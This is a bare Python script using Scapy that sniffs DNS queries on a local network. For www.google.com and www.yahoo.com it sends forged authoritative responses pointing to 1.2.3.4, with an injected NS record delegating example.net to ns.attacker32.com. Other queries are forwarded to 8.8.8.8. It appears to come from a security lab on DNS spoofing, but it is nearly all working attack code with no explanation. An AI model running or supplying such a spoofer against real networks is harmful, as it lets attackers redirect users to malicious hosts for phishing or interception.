#!/usr/bin/python3

from scapy.all import *


IFACE = "enp0s3"
DNS_SERVER_IP = "192.168.0.153"
SNIFF_FILTER = f"udp and (dst host {DNS_SERVER_IP} and dst port 53)"

#https://scapy.readthedocs.io/en/latest/troubleshooting.html
conf.L3socket = L3RawSocket

HOSTS = {}
HOSTS[b"www.google.com."] = "1.2.3.4"
HOSTS[b"www.yahoo.com."]= "1.2.3.4"
    
def dns_responder(local_ip: str):
    
    def forward_dns(pkt):
        
        print(f"Forwarding: {pkt[DNSQR].qname}")
        
        IPpkt = IP(dst="8.8.8.8")
        UDPpkt = UDP(dport=53, sport=pkt[UDP].sport)
        QDsec = DNSQR(qname=pkt[DNSQR].qname)
        DNSpkt = DNS(rd=1, id=pkt[DNS].id, qd=QDsec)
        packet = IPpkt / UDPpkt / DNSpkt 
        
        response = sr1(packet, verbose=0, iface=IFACE)
        
        resp_pkt = IP(dst="127.0.0.1", src=DNS_SERVER_IP) / UDP(sport=53, dport=pkt[UDP].sport)/DNS()
        resp_pkt[DNS] = response[DNS]
        
        print(f"Got response: {pkt[DNSQR].qname} -> {response[DNS].an[0].rdata}")
                
        send(resp_pkt, verbose=0)
        
        return f"Sending response to: {pkt[IP].src}"
    
    

    def get_response(pkt):
        
        print(f"Sniffed DNS Query from: {pkt[IP].src}:{pkt[UDP].sport}")
        
        if( DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 ):
            
            query = pkt[DNS].qd.qname

            if query not in HOSTS.keys():
                
                return forward_dns(pkt)
            
            else:
                
                IPpkt   = IP(dst=pkt[IP].src, src=DNS_SERVER_IP)
                
                UDPpkt  = UDP(dport=pkt[UDP].sport, sport=53)
                
                Anssec  = DNSRR(rrname=pkt[DNS].qd.qname, type="A", rclass="IN", rdata=HOSTS[query], ttl=259200)
                NSsec   = DNSRR(rrname="example.net", type="NS", rdata="ns.attacker32.com", ttl=259200)
                Addsec  = DNSRR(rrname="ns1.attacker32.com", type="A", rdata="10.2.3.1", ttl=259200)
               
                DNSpkt  = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, rd=0, qdcount=1, ancount=1, arcount=1, nscount=1, ns=NSsec, an=Anssec, ar=Addsec)
    
    
                spoofPkt = IPpkt / UDPpkt / DNSpkt
                                
                send(spoofPkt, verbose=1, iface=IFACE)
                
                return f"Spoofed DNS Reponse Sent to: {spoofPkt[IP].dst}: {spoofPkt[UDP].dport}"
            
    return get_response
            
            
    
    




sniff(filter=SNIFF_FILTER, prn=dns_responder(DNS_SERVER_IP), iface=IFACE)
